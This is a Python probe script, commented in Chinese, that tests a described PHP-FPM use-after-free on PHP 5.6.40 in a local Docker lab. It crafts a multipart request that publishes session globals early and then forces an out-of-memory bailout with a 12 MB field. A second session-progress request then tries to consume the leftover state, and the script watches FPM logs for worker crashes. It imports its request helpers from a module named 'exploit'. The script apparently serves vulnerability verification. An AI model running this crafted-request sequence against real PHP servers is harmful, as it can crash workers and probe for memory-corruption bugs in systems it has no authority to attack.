#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe5_56.py — CVE-2026-109619 窗口1（startup/multipart 解析期 OOM）验证探针
（PHP 5.6.40，纯 HTTP，nginx:8089）。

2026-10-21 公告（GHSA-6wmf-4rv5-p3rp）的 FPM 利用模型：producer 在 RINIT 之前
（rfc1867 FILE_START）发布 session worker 全局 → OOM bailout 早退跳过 END 清理
→ 同一 worker 上的下一请求 pre-RINIT 消费残留 → UAF。

5.6.40 源码链（容器 /usr/src/php，实测核对，详见 logs/evidence56_109619.md）：
  A 请求  multipart: PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + 文件字段
          -> MULTIPART_EVENT_FILE_START -> php_rinit_session(0) + PS(id)=estrndup
             （pre-RINIT 发布 PS 全局，与 8.4 模型一致）
          -> 12MB 普通字段 -> rfc1867.c multipart_buffer_read_body 逐 5KB
             erealloc 累积 -> memory_limit OOM -> zend_bailout
          -> main.c php_request_startup 的 zend_try（L1616/L1685 附近）吞掉
             bailout 降级为 FAILURE
          -> fpm_main.c L1927 startup FAILURE -> return FPM_EXIT_SOFTWARE(70)
          => child 连同整个请求堆退出（残留随进程销毁），master 重拉全新
             child（MINIT 级干净全局）。
  B 请求  （假设性 consumer，仅当 A 不杀 worker 时才有意义）：multipart 仅
             SID + progress（无文件字段）-> END cleanup 消费残留 PS 全局。
             A 已杀 worker 时 B 运行在新 child 上，与 A 状态无关——仍发送，
             用于验证服务恢复 + B 自身无害。
  C 请求  GET /index.php 存活探测。

指纹（2026-10-23 实测，4 次独立复现）：
  - A 响应为 200+chunked 空 body 或 502 —— 两者都是 worker 先死的 nginx
    表现（fatal 文本在送达前 worker 已 exit(70)，故 "Allowed memory size"
    不是必要证据）；
  - docker logs php56-fpm: `child NNN exited with code 70` + 立即重拉
    —— 这才是窗口1闭合的直接证据。

用法：
  python tools56/probe5_56.py [--url http://127.0.0.1:8089/index.php] [--rounds N]

退出码：0 = B 后观测到崩溃/5xx（109619 可观测，5.6 下不应出现）；
        1 = 窗口1闭合：A 的 OOM 致 child exit(70)（5.6 FPM 结构性排除，预期结果）；
        2 = A 存活（见 fatal 文本）但 B 正常；
        3 = A 未触发 OOM（无 fatal 文本、无 worker 死亡）。
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = "http://127.0.0.1:8089/index.php"
BIG = b"B" * (12 * 1024 * 1024)      # > 8M memory_limit：FILE_START 之后的 OOM
SID = b"attacksessionid0001"

A_DEATH = ("exited with code 70",)   # FPM 日志：worker 因 startup OOM 退出
CRASH = ("SIGSEGV", "SIGABRT", "exited on signal", "segmentation fault")


def a_parts(sid: bytes = SID) -> list:
    """A 请求：文件字段触发 FILE_START session 初始化，再 12MB 字段 OOM。

    字段顺序关键：文件字段必须在 big 之前 —— FILE_START 早于 big 字段
    解析，session 全局先发布，OOM 后 END 清理被 bailout 跳过。
    """
    return [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": BIG},
    ]


def b_parts(sid: bytes = SID) -> list:
    """B 请求：仅 SID + progress（无文件字段 => 不触发 FILE_START 的
    php_rinit_session，END cleanup 直接消费残留 PS 全局）。"""
    return [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]


def head_of(resp: bytes, n: int = 400) -> str:
    head, _, _ = resp.partition(b"\r\n\r\n")
    return head.decode("latin1", "replace")[:n]


def docker_fpm_sh(cmd: str) -> str:
    try:
        out = subprocess.run(
            ["docker", "exec", "php56-fpm", "sh", "-c", cmd],
            capture_output=True, text=True, timeout=10,
        )
        return out.stdout
    except Exception:
        return ""


def fpm_child_pid() -> str | None:
    """当前 FPM pool worker PID（扫 /proc，不依赖容器内装 ps）。"""
    out = docker_fpm_sh(
        "for d in /proc/[0-9]*; do "
        "if tr '\\0' ' ' < $d/cmdline 2>/dev/null | grep -q 'php-fpm: pool'; then "
        "basename $d; fi; done")
    for line in out.splitlines():
        line = line.strip()
        if line.isdigit():
            return line
    return None


def fpm_log_lines(since_ts: float, patterns: tuple[str, ...]) -> list[str]:
    """抓取 FPM 日志里 since_ts 之后匹配任一 pattern 的行。"""
    try:
        out = subprocess.run(
            ["docker", "logs", "--since",
             f"{int(time.time() - since_ts) + 1}s", "php56-fpm"],
            capture_output=True, text=True, timeout=10,
        )
        blob = out.stdout + out.stderr
    except Exception:
        return []
    return [ln for ln in blob.splitlines() if any(p in ln for p in patterns)]


def one_round(url: str, i: int) -> tuple[str, dict]:
    info: dict = {}
    t = Target(url, timeout=90.0, verbose=False)

    # --- A: pre-RINIT 发布 session 全局 + multipart OOM bailout ---
    pid_a = fpm_child_pid()
    info["pid_a"] = pid_a
    t0 = time.time()
    resp_a = t.post(build_multipart(a_parts(), b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=90.0)
    info["a_fatal"] = b"Allowed memory size" in resp_a
    info["a_head"] = head_of(resp_a, 40)
    print(f"  [A] fatal(OOM)={info['a_fatal']} pid={pid_a} head={info['a_head']!r}")
    time.sleep(1.5)  # 等 master 重拉新 child

    # worker 死亡判定：PID 变化 与 FPM 日志 exit(70) 任一成立即成立
    #（fatal 文本因 worker 先死而不可达，不作必要条件）
    pid_after_a = fpm_child_pid()
    info["pid_after_a"] = pid_after_a
    death_lines = fpm_log_lines(t0, A_DEATH)
    info["a_death_lines"] = death_lines[:2]
    a_killed = ((pid_a is not None and pid_after_a is not None
                 and pid_a != pid_after_a) or bool(death_lines))
    info["a_killed_worker"] = a_killed
    if a_killed:
        print(f"  [A] worker killed: pid {pid_a}->{pid_after_a}, "
              f"exit70_log={len(death_lines)} —— 窗口1闭合，残留随进程销毁")
        for ln in death_lines[:2]:
            print(f"      log: {ln[:130]}")

    # --- B: END cleanup consumer（A 杀掉 worker 时跑在新 child 上）---
    pid_b = fpm_child_pid()
    try:
        resp_b = t.post(build_multipart(b_parts(), b"BNDRY12345"), b"BNDRY12345",
                        read_cap=1 << 20, timeout=45.0)
        info["b_head"] = head_of(resp_b, 200)
        info["b_reset"] = not resp_b  # 空响应 => 连接被 RST
    except OSError as e:
        info["b_head"] = f"conn-error: {e}"
        info["b_reset"] = True
    print(f"  [B] reset={info['b_reset']} head={info['b_head'][:60]!r}")
    time.sleep(1.0)

    # --- C: 存活探测 ---
    pid_c = fpm_child_pid()
    info["pid_c"] = pid_c
    try:
        code_c, body_c = t.get("/index.php", read_cap=4096)
        info["c_code"] = code_c
        info["c_ok"] = code_c == 200 and b"OK" in body_c
    except OSError:
        info["c_code"] = 0
        info["c_ok"] = False
    crash_lines = fpm_log_lines(t0, CRASH)
    info["crash_lines"] = crash_lines[:4]
    print(f"  [C] code={info['c_code']} ok={info['c_ok']} pid={pid_b}->{pid_c}")
    for ln in crash_lines[:4]:
        print(f"      log: {ln[:130]}")

    # 判定
    if crash_lines or info["c_code"] in (502, 504) or info["c_code"] == 0:
        return "B-CRASH", info           # B 阶段 worker 异常（109619 可观测信号）
    if info["b_reset"]:
        return "B-RESET", info
    if a_killed:
        return "A-KILLED-WORKER", info   # 窗口1闭合：5.6 结构性排除
    if info["c_ok"]:
        return "A-SURVIVED", info        # A 存活但 B 正常
    return "UNKNOWN", info


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=URL)
    ap.add_argument("--rounds", type=int, default=3)
    args = ap.parse_args()

    print(f"{'=' * 62}\n[*] CVE-2026-109619 窗口1 probe on PHP 5.6.40:\n"
          f"    A(pre-RINIT 发布 + multipart OOM) -> B(END-cleanup consumer) -> C(liveness)\n"
          f"{'=' * 62}")
    verdicts: dict[str, int] = {}
    for i in range(args.rounds):
        print(f"\n--- round {i} ---")
        v, info = one_round(args.url, i)
        verdicts[v] = verdicts.get(v, 0) + 1
        if not info.get("a_fatal") and not info.get("a_killed_worker"):
            print("  [!] A 未观察到任何 OOM 证据（无 fatal 文本、无 worker 死亡）"
                  " —— 检查 memory_limit/上传设置")
            return 3
    print(f"\n[=] verdicts: {verdicts}")

    if verdicts.get("B-CRASH") or verdicts.get("B-RESET"):
        print("[+] OBSERVED: 109619 producer/consumer 语义成立"
              "（B 在 worker 上触发崩溃/5xx）")
        return 0
    if verdicts.get("A-KILLED-WORKER"):
        print("[=] WINDOW-1 CLOSED: A 的 pre-RINIT OOM 致 child exit(70) + master 重拉，"
              "残留状态随进程销毁，B/C 在新 child 上均正常 —— CVE-2026-109619 "
              "在 5.6 FPM 结构性排除（与上游不给 5.6 补丁互恰）。")
        return 1
    print("[-] A 存活但 B 未触发可观测崩溃（残留可能被非崩溃路径消费，见 fpm 日志）")
    return 2


if __name__ == "__main__":
    sys.exit(main())
